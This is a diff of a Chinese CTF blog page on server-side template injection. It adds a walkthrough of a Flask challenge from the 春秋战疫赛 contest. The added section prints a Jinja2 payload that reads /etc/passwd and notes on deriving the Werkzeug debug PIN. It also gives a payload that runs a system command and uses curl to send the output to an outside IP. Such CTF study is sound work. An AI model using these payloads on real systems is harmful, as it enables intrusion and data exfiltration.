@@ -82,14 +82,18 @@
 
 
 
-<meta name="description" content="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/ https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC">
+<meta name="description" content="春秋战疫赛 flask 进去之后有两个功能: base64 加密 , base64 解密 将base64加密一下之后放进base64解密后就会触发代码  直接执行命令, 发现有过滤 尝试触发base64解密功能中的报错, 发现debug模式开启, 而且看到了部分源码  在debug模式开启的情况下, 可以通过pin码在客户端使用debug模式中的命令行, 计算pin码一开始参考的https://x">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/SSTI/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/ https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC">
+<meta property="og:description" content="春秋战疫赛 flask 进去之后有两个功能: base64 加密 , base64 解密 将base64加密一下之后放进base64解密后就会触发代码  直接执行命令, 发现有过滤 尝试触发base64解密功能中的报错, 发现debug模式开启, 而且看到了部分源码  在debug模式开启的情况下, 可以通过pin码在客户端使用debug模式中的命令行, 计算pin码一开始参考的https://x">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200223122504608.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200223123003296.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200224110652405.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200223141211172.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200205011806726.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200130182744898.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200121164528251.png">
@@ -104,11 +108,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png">
-<meta property="og:updated_time" content="2020-02-16T05:44:44.138Z">
+<meta property="og:updated_time" content="2020-02-24T03:22:40.598Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSTI 题型记录[working forever]">
-<meta name="twitter:description" content="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/ https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC">
-<meta name="twitter:image" content="http://yoursite.com/images/image-20200205011806726.png">
+<meta name="twitter:description" content="春秋战疫赛 flask 进去之后有两个功能: base64 加密 , base64 解密 将base64加密一下之后放进base64解密后就会触发代码  直接执行命令, 发现有过滤 尝试触发base64解密功能中的报错, 发现debug模式开启, 而且看到了部分源码  在debug模式开启的情况下, 可以通过pin码在客户端使用debug模式中的命令行, 计算pin码一开始参考的https://x">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200223122504608.png">
 
 
 
@@ -348,8 +352,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2020-02-16T13:44:44+08:00">
-                2020-02-16
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-24T11:22:40+08:00">
+                2020-02-24
               </time>
             
           </span>
@@ -398,7 +402,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.8k
+                  2.1k
                 </span>
               
 
@@ -414,7 +418,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  9
+                  10
                 </span>
               
             </div>
@@ -435,7 +439,22 @@
       
 
       
-        <p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>
+        <h2 id="春秋战疫赛-flask">春秋战疫赛 flask</h2>
+<p>进去之后有两个功能: base64 加密 , base64 解密</p>
+<p>将<code></code>base64加密一下之后放进base64解密后就会触发代码</p>
+<p><img src="/images/image-20200223122504608.png" alt="image-20200223122504608"></p>
+<p>直接执行命令, 发现有过滤</p>
+<p>尝试触发base64解密功能中的报错, 发现debug模式开启, 而且看到了部分源码</p>
+<p><img src="/images/image-20200223123003296.png" alt="image-20200223123003296"></p>
+<p>在debug模式开启的情况下, 可以通过pin码在客户端使用debug模式中的命令行, 计算pin码一开始参考的https://xz.aliyun.com/t/2553 ,需要知道以下变量就可以计算出pin码</p>
+<p><img src="/images/image-20200224110652405.png" alt="image-20200224110652405"></p>
+<p>读取方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>但是计算出来的pin码不对, 后来学长告诉我不读/etc/machine-id, 读/proc/self/cgroup的第一个</p>
+<p><img src="/images/image-20200223141211172.png" alt="image-20200223141211172"></p>
+<p>也可以直接getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&quot;sy&quot;+&quot;stem&quot;](&quot;a=$(ls /) &amp;&amp; curl -d \&quot;$a\&quot; 123.207.149.181:2333&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a>](<a href="https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a>)</p>
 <p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</a></p>
 <h2 id="2019-GWCTF-你的名字">2019 GWCTF 你的名字</h2>
 <p>是个模板注入, 测试的时候<code>49</code>爆出了php类型的错误, wp说从响应请求头可以看出后台其实是python, 看了下返回的请求头中有价值的只有<code>server:openrestry</code>这一项, 也不知道是怎么看出来的.</p>
@@ -637,7 +656,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -729,7 +748,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-GWCTF-你的名字"><span class="nav-number">1.</span> <span class="nav-text">2019 GWCTF 你的名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-BJDCTF-Cookie-is-so-stable"><span class="nav-number">2.</span> <span class="nav-text">2020 BJDCTF Cookie is so stable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-BJDCTF-The-Mystrery-of-IP"><span class="nav-number">3.</span> <span class="nav-text">2020 BJDCTF The_Mystrery_of_IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南赛区-Double-Secret"><span class="nav-number">4.</span> <span class="nav-text">ciscn 华东南赛区 Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF-2019-flag-shop"><span class="nav-number">5.</span> <span class="nav-text">SCTF 2019 flag shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">6.</span> <span class="nav-text">CISCN2019 华东南赛区 Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">7.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">8.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#春秋战疫赛-flask"><span class="nav-number">1.</span> <span class="nav-text">春秋战疫赛 flask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-GWCTF-你的名字"><span class="nav-number">2.</span> <span class="nav-text">2019 GWCTF 你的名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-BJDCTF-Cookie-is-so-stable"><span class="nav-number">3.</span> <span class="nav-text">2020 BJDCTF Cookie is so stable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-BJDCTF-The-Mystrery-of-IP"><span class="nav-number">4.</span> <span class="nav-text">2020 BJDCTF The_Mystrery_of_IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-华东南赛区-Double-Secret"><span class="nav-number">5.</span> <span class="nav-text">ciscn 华东南赛区 Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF-2019-flag-shop"><span class="nav-number">6.</span> <span class="nav-text">SCTF 2019 flag shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">7.</span> <span class="nav-text">CISCN2019 华东南赛区 Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">8.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">9.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
             
 
           </div>
@@ -763,7 +782,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">74.6k</span>
+    <span title="Site words total count">77.4k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
